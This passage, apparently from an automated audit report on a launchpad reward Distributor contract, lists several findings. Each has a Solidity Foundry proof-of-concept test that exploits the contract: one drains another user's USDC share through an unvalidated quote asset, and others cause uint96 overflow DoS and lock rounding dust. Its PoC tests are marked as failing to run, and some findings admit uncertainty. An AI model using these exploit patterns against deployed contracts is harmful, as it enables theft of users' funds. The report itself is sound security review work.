5. `_distributeAssets` is called with `rs.quoteAsset` (USDC) and amount 1,000.
6. `_decreaseTotalPending(USDC, 1000)` succeeds (1,000 <= 1,000). Bob receives 1,000 USDC (the entire pool).
7. Alice attempts to claim. `totalPendingRewards[USDC]` is now 0. Her claim reverts or fails, and her share of the rewards is lost to Bob.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract AddRewardsExploitTest is Test {
    Distributor distributor;
    MockERC20 launchToken;
    MockERC20 usdc;
    MockERC20 fake;

    address user1 = address(0xA11CE);
    address user2 = address(0xB0B);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set launchpad to this test contract

        launchToken = new MockERC20("LAUNCH", "LCH");
        usdc = new MockERC20("USDC", "USDC");
        fake = new MockERC20("FAKE", "FAKE");

        // Create rewards pair (launchAsset=launchToken, quoteAsset=USDC)
        distributor.createRewardsPair(address(launchToken), address(usdc));

        // Seed equal shares for two users (onlyLaunchpad)
        distributor.increaseStake(address(launchToken), user1, 100);
        distributor.increaseStake(address(launchToken), user2, 100);
    }

    function test_addRewards_quote_validation_exploit() public {
        // 1) Add legitimate USDC rewards
        usdc.mint(address(this), 1000);
        usdc.approve(address(distributor), 1000);
        distributor.addRewards(address(launchToken), address(usdc), 0, 1000);

        // 2) Attacker injects fake quote rewards to inflate accumulator
        fake.mint(address(this), 1000);
        fake.approve(address(distributor), 1000);
        distributor.addRewards(address(launchToken), address(fake), 0, 1000);

        // 3) Attacker claims disproportionate share of real USDC (steals honest user's share)
        vm.prank(user2);
        (uint256 baseOut, uint256 quoteOut) = distributor.claimRewards(address(launchToken));
        assertEq(baseOut, 0);
        assertEq(quoteOut, 1000); // should have been 500, but gets 1000 due to inflation
        assertEq(usdc.balanceOf(user2), 1000);

        // 4) Honest user is starved: global USDC escrow is now empty for this asset
        vm.startPrank(user1);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(launchToken));
        vm.stopPrank();
    }
}


## Suggested Mitigation
In addRewards, after determining which token is the launch asset, enforce that the provided quote token matches the pool configuration: if (quoteAsset != rs.quoteAsset) revert InvalidQuoteAsset(); Additionally, use rs.quoteAsset for accounting and transfers of quote rewards to prevent mismatches. This ensures pendingQuoteRewards and totalPendingRewards are only ever updated with the correct, configured quote asset.





 **Derived From** : Issue Type: AccountingInvariantViolation

## [H-16]. User Rewards Misdirected to Launchpad Contract

### Finding Severity Justification: Pending user rewards are transferred to the wrong recipient during stake/unstake updates. increaseStake/decreaseStake pay out accrued rewards but transfer them to msg.sender (the Launchpad), not the intended user. This causes a direct loss of user-owed assets unless an external forwarding mechanism exists and is correctly implemented. The impact is real asset loss across all users interacting via the Launchpad.
## Derived From Pattern/Invariant
Issue Type: AccountingInvariantViolation

## Exploit Type
StandardViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Launchpad.sol was not provided; if it reliably forwards the transferred rewards to the user/account every time, the practical impact would be mitigated. In absence of that proof, the bug stands as written. Therefore, marked valid with some uncertainty due to missing upstream caller logic.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `increaseStake` and `decreaseStake` functions in `Distributor` are restricted to `onlyLaunchpad`. These functions call `_distributeAssets` to pay out pending rewards. `_distributeAssets` transfers tokens to `msg.sender`. Since `msg.sender` is the `Launchpad` contract during these calls, the user's accrued rewards are sent to the `Launchpad` contract instead of the user. Unless the Launchpad has specific logic to forward these (which is not standard), the funds are permanently lost to the user.

## Impact
Whenever a user's stake is modified via increaseStake/decreaseStake (which are only callable by the Launchpad), any pending rewards for that user are paid out to msg.sender (the Launchpad contract) instead of the intended user. This drains the user's accrued rewards at each stake delta. While claimRewards() pays directly to the caller, the rewards that were already misdirected during stake changes cannot be reclaimed by the user unless the Launchpad implements correct and reliable forwarding or internal crediting logic. In the absence of such logic, users suffer a direct and repeated loss of their accrued rewards.

## Command to Run Test


## Proof of Concept
1) Assume a user already has some shares recorded in the Distributor and pending rewards exist in the pool.
2) The user performs an action through the Launchpad that changes their shares (e.g., buys more or sells), causing Launchpad to call Distributor.increaseStake/decreaseStake(launchAsset, user, sharesDelta).
3) RewardsTracker.stake/unstake returns (baseAmount, quoteAmount) owed to the user at that moment.
4) Distributor._distributeAssets(...) reduces totalPendingRewards and transfers tokens to msg.sender.
5) Because msg.sender is the Launchpad (onlyLaunchpad), tokens go to the Launchpad address, not the user. The user’s pending rewards are thus depleted but not received by them.
6) Later, user calling claimRewards() will only receive rewards accrued after the last stake delta (misdirected portion is already paid to Launchpad).

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract DistributorMisdistributionTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;

    address launchpad = address(0xBEEF);
    address user = address(0xA11CE);

    function setUp() public {
        distributor = new Distributor();
        base = new MockERC20("BASE", "BASE");
        quote = new MockERC20("QUOTE", "QUOTE");

        // Initialize launchpad address
        distributor.initialize(launchpad);

        // Create rewards pair (onlyLaunchpad)
        vm.prank(launchpad);
        distributor.createRewardsPair(address(base), address(quote));

        // Give user initial stake via launchpad (no rewards yet)
        vm.prank(launchpad);
        distributor.increaseStake(address(base), user, uint96(100));

        // Mint rewards tokens to this test contract and approve Distributor to pull
        base.mint(address(this), 1_000 ether);
        quote.mint(address(this), 500 ether);
        base.approve(address(distributor), type(uint256).max);
        quote.approve(address(distributor), type(uint256).max);

        // Add rewards to the pool (requires totalShares > 0)
        distributor.addRewards(address(base), address(quote), uint128(1_000 ether), uint128(500 ether));
    }

    function testRewardsMisdirectedToLaunchpadOnStakeUpdate() public {
        // Simulate the user buying more (stake increase) via the Launchpad
        vm.prank(launchpad);
        (uint256 basePaid, uint256 quotePaid) = distributor.increaseStake(address(base), user, uint96(50));

        // Assert rewards left Distributor to the Launchpad, not to the user
        assertEq(base.balanceOf(launchpad), basePaid, "base sent to launchpad");
        assertEq(quote.balanceOf(launchpad), quotePaid, "quote sent to launchpad");
        assertEq(base.balanceOf(user), 0, "user did not receive base rewards");
        assertEq(quote.balanceOf(user), 0, "user did not receive quote rewards");

        // For completeness: if user now calls claimRewards, they only get rewards accrued AFTER the misdirection
        vm.prank(user);
        (uint256 baseLater, uint256 quoteLater) = distributor.claimRewards(address(base));
        // baseLater / quoteLater will typically be 0 here unless more rewards were added after the previous stake delta
        assertEq(base.balanceOf(user), baseLater, "user receives only later accruals");
        assertEq(quote.balanceOf(user), quoteLater, "user receives only later accruals");
    }
}


## Suggested Mitigation
Do not route stake/unstake payouts to msg.sender. Introduce an explicit receiver parameter for distributions and use it consistently:
- Change _distributeAssets to accept a receiver argument: _distributeAssets(address receiver, address base, uint256 baseAmount, address quote, uint256 quoteAmount) and transfer to receiver instead of msg.sender.
- In increaseStake/decreaseStake, pass the user account as the receiver: _distributeAssets(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount).
- In claimRewards, pass msg.sender as the receiver: _distributeAssets(msg.sender, launchAsset, baseAmount, rs.quoteAsset, quoteAmount).
This preserves intended behavior for direct user claims while ensuring that stake/unstake updates pay the correct recipient. If Launchpad must custodialize rewards, add an explicit receiver field in the call (e.g., account or a designated custodian) and document the custody model to avoid silent misdirection.





 **Derived From** : Issue Type: UnsafeAssembyTypeCasts

## [M-17]. Token Supply Cap of uint96 causes DoS or Reward Loss

### Finding Severity Justification: RewardsTracker and Distributor use uint96 for user shares and totalShares. If a launched token’s effective staked amount (shares) exceeds type(uint96).max (~7.9e28 base units; ~79B tokens at 18 decimals), the narrowing cast to uint96 will truncate (Solidity 0.8 truncates on downcasts) or revert if a safe-cast helper is used upstream. This results in either: (a) DoS of stake/buy flows for that launch (if reverted), or (b) silent truncation, causing permanent under-accounting of user shares and thus loss of matured rewards distribution. Impact is meaningful (loss of matured rewards or unusable launch for high-supply tokens), but it requires a large-supply token configuration, so Medium.
## Derived From Pattern/Invariant
Issue Type: UnsafeAssembyTypeCasts

## Exploit Type
StandardViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The conclusion depends on how shares are derived in Launchpad/LaunchToken (not fully shown). If LaunchToken enforces a total supply <= uint96 or scales shares, the risk would be mitigated. Given the docs indicate permissionless launches and staking shares tied to token balances, and no visible cap/scale in the provided snippets, the risk is likely real but not proven with the missing Launchpad specifics.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor` and `RewardsTrackerLib` restrict share amounts to `uint96`. `type(uint96).max` is approximately 7.9e28. For 18-decimal tokens, this is ~79 Billion tokens. Many meme coins (a primary target for launchpads) have supplies in the Trillions or Quadrillions. If a token exceeds this cap, `increaseStake` will either revert (if cast safely upstream) causing DoS of the Launchpad buy function, or truncate (if cast unsafely) causing severe loss of user rewards.

## Impact
Because shares and reward-debts are stored as uint96, two distinct failures can occur: (1) totalShares overflow DoS: once any stake pushes totalShares to type(uint96).max, any subsequent stake reverts (overflow on add), halting bonding/stake flows for that launch. This can happen naturally for high-supply tokens where shares track token units. (2) rewardDebt truncation: when totalAccRewards exceeds type(uint96).max, casting to uint96 silently truncates the user’s rewardDebt. After a large claim, future claim/unstake calculations produce an inflated payout (totalAccRewards - truncatedDebt) that exceeds Distributor.totalPendingRewards and reverts with ClaimAmountExceedsTotalPendingRewards until enough new rewards are added. This locks users out of claim/unstake and corrupts reward accounting. Both issues are realistic for high-supply tokens (>= ~79B units at 18 decimals) or large per-update rewards.

## Command to Run Test


## Proof of Concept
Two independent exploit scenarios:
A) totalShares overflow DoS
1) Create rewards pair for a high-supply token; shares track token units.  
2) A whale stakes type(uint96).max shares.  
3) Now totalShares == type(uint96).max.  
4) Any subsequent user trying to stake > 0 shares reverts due to uint96 addition overflow in RewardsTrackerLib.stake (self.totalShares += newShares), DoSing further participation for that launch.

B) rewardDebt truncation leads to stuck claims/unstakes
1) Create rewards pair; an account has 1 share.  
2) A very large amount of base rewards is added in a single update: amount > type(uint96).max (addRewards is permissionless and accepts uint128).  
3) On claim, user correctly receives the large reward R, but baseRewardDebt is set to uint96(R), silently truncating.  
4) Next claim or unstake computes baseAmount = totalAccRewards - truncatedDebt ≈ R again, but Distributor.totalPendingRewards is 0 (already paid), so _decreaseTotalPending reverts with ClaimAmountExceedsTotalPendingRewards. User is locked out until new rewards > (R - truncatedDebt) are added.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) { require(a >= amount, "allow"); allowance[from][msg.sender] = a - amount; }
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true;
    }
}

contract DistributorUint96CapTest is Test {
    Distributor internal dist;
    MockERC20 internal base;
    MockERC20 internal quote;
    address internal user = address(0xBEEF);
    address internal whale = address(0xCAFE);
    address internal other = address(0xD00D);

    function setUp() public {
        dist = new Distributor();
        base = new MockERC20("BASE", "B", 18);
        quote = new MockERC20("QUOTE", "Q", 18);
        // set launchpad to this test contract
        dist.initialize(address(this));
        // create rewards pair (onlyLaunchpad)
        dist.createRewardsPair(address(base), address(quote));
    }

    function test_rewardDebtTruncation_breaksNextClaims() public {
        // Give user 1 share so totalShares > 0
        dist.increaseStake(address(base), user, 1);

        // Add a very large reward R > type(uint96).max in a single update
        uint256 R = uint256(type(uint96).max) + 1; // fits into uint128
        base.mint(address(this), R);
        base.approve(address(dist), R);
        dist.addRewards(address(base), address(quote), uint128(R), 0);

        // First claim pays R to user
        vm.prank(user);
        (uint256 baseAmt,) = dist.claimRewards(address(base));
        assertEq(baseAmt, R, "first claim should pay full R");
        assertEq(base.balanceOf(user), R, "user received R");

        // Next claim reverts because rewardDebt was truncated to uint96,
        // making (totalAccRewards - debt) large while totalPendingRewards == 0
        vm.expectRevert(abi.encodeWithSelector(Distributor.ClaimAmountExceedsTotalPendingRewards.selector));
        vm.prank(user);
        dist.claimRewards(address(base));
    }

    function test_totalSharesOverflow_DoS() public {
        // Whale saturates totalShares to max
        dist.increaseStake(address(base), whale, type(uint96).max);
        // Any further stake must revert due to uint96 overflow on totalShares
        vm.expectRevert();
        dist.increaseStake(address(base), other, 1);
    }
}


## Suggested Mitigation
- Use wider types for shares and reward debts:
  - Change RewardPoolData.totalShares, UserRewardData.shares, baseRewardDebt, quoteRewardDebt to uint128 or uint256. Likewise, update IDistributor.increaseStake/decreaseStake to accept uint128 or uint256 and remove narrowing casts.
  - Keep all intermediate arithmetic in uint256; only downcast to storage width that safely accommodates your maximum expected values.
- If storage packing is critical, introduce a per-pool scaling factor for shares (e.g., define shares = amount / scale) chosen at pair initialization so that totalShares never approaches the chosen bit cap. Store the scale in the pool struct and use it consistently in stake/unstake/claim.
- For rewardDebt specifically, avoid truncation entirely: store as uint256. If you must downcast, use a safe-cast that reverts on overflow to fail early and clearly, rather than silently corrupting accounting.
- Additionally, add sanity checks in launch configuration (token supply, decimals, and expected max participants) to ensure that even worst-case totalShares and per-update rewards cannot exceed the chosen bit widths.





 **Derived From** : RoundingError

## [L-18]. Loss of Rewards due to Precision Loss in Tracker (Dust Accumulation)

### Finding Severity Justification: RewardsTrackerLib.update() floors the per-share increment ((pending * 1e12) / totalShares) and then deletes pending{Base,Quote}Rewards, so the division remainder is never rolled over. This creates permanently unclaimable "dust" that remains in the Distributor contract. While it is a real loss of matured yield, the precision factor (1e12) caps loss per update to < totalShares/1e12 token units, which is typically negligible relative to pool sizes. There is no theft or outsized user loss; impact is cumulative dust lockup, hence QA/Low.
## Derived From Pattern/Invariant
RoundingError

## Exploit Type
RoundingError

## Location
RewardsTrackerLib.update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib.update`, the remainder of the division `(pending * PRECISION_FACTOR) / totalShares` is discarded. `pendingBaseRewards` is then deleted (reset to 0). This remainder represents valid reward tokens that are not added to the accumulator. Over time, or with low-value/high-share ratios, this leaks value that remains stuck in the contract.

## Impact
Due to integer division when converting pending rewards into accRewardPerShare and then deleting pending{Base,Quote}Rewards, a remainder of valid reward tokens becomes permanently undistributable to stakers. This remainder also cannot be swept by the admin because Distributor enforces balance - totalPendingRewards when skimming, and totalPendingRewards is incremented by the full amount originally added but only decremented by actually paid claims. As a result, the remainder stays locked in the Distributor (unclaimable by users and non-skimmable by admin).

## Command to Run Test


## Proof of Concept
Setup: totalShares = 30, pendingBaseRewards = 100, PRECISION_FACTOR = 1e12.
1) In RewardsTrackerLib.getAccRewardsPerShare():
   - delta = floor(pendingBaseRewards * PRECISION_FACTOR / totalShares)
           = floor(100 * 1e12 / 30)
           = 3,333,333,333,333.
2) In update():
   - self.accBaseRewardPerShare += delta
   - delete self.pendingBaseRewards (set to 0)
3) Two users hold shares: userA=10, userB=20. On claim:
   - userA gets floor(10 * delta / 1e12) = floor(33.333333333333) = 33
   - userB gets floor(20 * delta / 1e12) = floor(66.666666666666) = 66
   - Total distributed = 99, even though 100 was added; 1 token is lost to rounding.
4) In Distributor:
   - addRewards increased totalPendingRewards[base] by 100 and transferred 100 tokens in.
   - After both claims, totalPendingRewards[base] decreased by 99 (actual transfers), leaving 1.
   - getPendingRewards for both users returns 0 because pending was deleted and acc reflects the floored increment.
   - Admin cannot skim the leftover 1 token: skimExcessRewards reverts with SkimOverflow since balance - totalPendingRewards == 0. The 1 token is stuck forever.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amt, "allow");
        require(balanceOf[from] >= amt, "bal");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract RewardsDustTest is Test {
    Distributor public distributor;
    MockERC20 public base;
    MockERC20 public quote;

    address public userA = address(0xA11CE);
    address public userB = address(0xB0B);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set this test as launchpad

        base = new MockERC20("BASE", "BASE");
        quote = new MockERC20("QUOTE", "QUOTE");

        // Create rewards pair for base/quote
        distributor.createRewardsPair(address(base), address(quote));

        // Seed shares: totalShares = 30 (10 + 20)
        distributor.increaseStake(address(base), userA, 10);
        distributor.increaseStake(address(base), userB, 20);

        // Add rewards: 100 base tokens
        base.mint(address(this), 100);
        base.approve(address(distributor), 100);
        distributor.addRewards(address(base), address(quote), 100, 0);
    }

    function test_DustAccumulatesAndIsUnclaimable() public {
        // Users claim after update is applied inside claim()
        vm.prank(userA);
        (uint256 aBase,) = distributor.claimRewards(address(base));
        vm.prank(userB);
        (uint256 bBase,) = distributor.claimRewards(address(base));

        // With totalShares=30, pending=100, PRECISION=1e12:
        // aBase=33, bBase=66, total=99 → 1 token dust remains
        assertEq(aBase, 33, "userA claim");
        assertEq(bBase, 66, "userB claim");

        // Distributor still holds 1 token that cannot be claimed
        assertEq(base.balanceOf(address(distributor)), 1, "dust stuck in distributor");

        // Accounting shows 1 pending remainder that prevents skimming
        assertEq(distributor.totalPendingRewards(address(base)), 1, "pending remainder");

        // No more pending rewards for users
        (uint256 aPend,) = distributor.getPendingRewards(address(base), userA);
        (uint256 bPend,) = distributor.getPendingRewards(address(base), userB);
        assertEq(aPend, 0, "userA pending");
        assertEq(bPend, 0, "userB pending");

        // Admin cannot skim the dust due to accounting guard
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(base), 1);
    }
}


## Suggested Mitigation
Carry the division remainder forward instead of deleting pending rewards entirely. For each token leg in update():
- Compute the per-share increment and the actually distributable amount in token units, then only subtract the distributed portion from pending, preserving the remainder for the next round. Example change:

// Pseudocode inside update()
if (self.pendingBaseRewards > 0 && self.totalShares > 0) {
    uint256 delta = (uint256(self.pendingBaseRewards) * PRECISION_FACTOR) / self.totalShares;
    self.accBaseRewardPerShare += delta;
    uint128 distributed = uint128((delta * self.totalShares) / PRECISION_FACTOR); // floor back to tokens
    self.pendingBaseRewards -= distributed; // keep the remainder carried over
}

Repeat similarly for quote rewards. Alternatively, increase PRECISION_FACTOR (e.g., to 1e18) to further reduce dust, but the remainder-carry approach fully eliminates permanent loss without relying on higher precision. Consider adding an admin sweep after pool deactivation to transfer any final negligible remainder if the pool is closed and no shares remain.



